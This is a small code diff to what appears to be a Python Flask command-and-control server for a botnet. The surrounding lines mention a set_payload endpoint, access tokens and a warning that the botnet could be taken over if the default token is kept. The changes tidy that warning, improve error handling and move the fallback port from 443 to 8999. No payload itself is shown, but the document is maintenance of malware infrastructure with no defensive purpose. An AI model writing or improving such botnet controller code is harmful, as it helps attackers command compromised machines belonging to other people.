@@ -54,11 +54,11 @@ def set_payload():
 	return "OK", 200
 
 if TOKENS == ["123456qwerty"]:
-	print("!!!!!!!!!!!!!!!!!!!!!!!!!!! CHANGE THE FUCKEN TOKEN YOUR BOTNET WILL GET HECKED!!!!!111!!!1!!1!!!")
+	print("!IMPORTANT! Please change the token.")
 
 #comment everything below if you want to run this on pythonanywhere
 try:
 	app.run(host=COMMAND_URL.split("://")[-1].split(":")[0], port=COMMAND_URL.split("://")[-1].split(":")[-1])
-except:
-	print("А ОШИБКА СТОП 0000000")
-	app.run(host="0.0.0.0", port=443)
+except Exception as e:
+	print("An error occured when attempting to bind to host. Defaulting to 0.0.0.0:8999")
+	app.run(host="0.0.0.0", port=8999)
